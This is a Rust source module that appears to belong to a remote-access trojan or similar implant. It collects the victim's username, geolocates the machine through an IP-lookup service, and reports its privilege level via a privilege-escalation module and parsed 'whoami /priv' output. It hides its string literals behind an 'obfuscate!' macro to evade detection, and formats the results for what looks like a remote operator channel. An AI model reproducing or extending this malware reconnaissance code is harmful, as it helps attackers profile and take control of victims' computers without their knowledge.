use anyhow::Result;
use tokio::process::Command;
use reqwest;
use serde_json::Value;

use crate::modules::privesc;
use crate::obfuscate;



/*
- bold: *b_, _b* 
*/

pub async fn id() -> Result<String> {
	let hostname = std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string());	
	Ok(hostname)
}

pub fn location() -> Result<String> {

	let link: &str = &obfuscate!("http://ip-api.com/json/");
	let city: &str = &obfuscate!("city");
	let country : &str = &obfuscate!("country");
	let reg_name: &str = &obfuscate!("regionName");

	let response: Value = reqwest::blocking::get(link)?.json()?;
    let ip = response["query"].as_str().unwrap_or("Unknown");
    let city = response[city].as_str().unwrap_or("Unknown");
    let country = response[country].as_str().unwrap_or("Unknown");
    let reg_name = response[reg_name].as_str().unwrap_or("Unknown");

    Ok(format!("{ip} - {city}, {reg_name}, {country}"))
}



pub async fn getprivs() -> Result<String>{

    let mut list = String::new();

	let user    : &str = &obfuscate!("Normal User *b_(Low Integrity)_b*");
	let admin_m : &str = &obfuscate!("Administrator *b_(Medium Integrity)_b*");
	let admin_h : &str = &obfuscate!("Administrator *b_(High Integrity)_b*");
	let system  : &str = &obfuscate!("*b_ NT AUHTORITY/SYSTEM _b*");

	let result    =  match privesc::privs().await {
		Ok(0x1000) => user,
		Ok(0x2000) => admin_m,
		Ok(0x3000) => admin_h,
		Ok(0x4000) => system,
		 _ => "?",
	};
	

	list += result;
	list += "\n----\n";

    let cmd = obfuscate!("whoami");
    let prv = obfuscate!("/priv");
    let output = Command::new(&cmd).arg(&prv).output().await?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<_> = stdout.lines()
        .skip_while(|line| !line.contains("="))
        .skip(1)
        .filter_map(|line| {
            let first_word = line.split_whitespace().next().unwrap_or("");
            let lats_word  = line.split_whitespace().last().unwrap_or("");  
            Some((first_word, lats_word))   
        })
        .collect();

    for (privilege, state) in  lines {
        list += &format!("\n*b_{}:_b*    {}", privilege, state);
    }
    Ok(list)
}
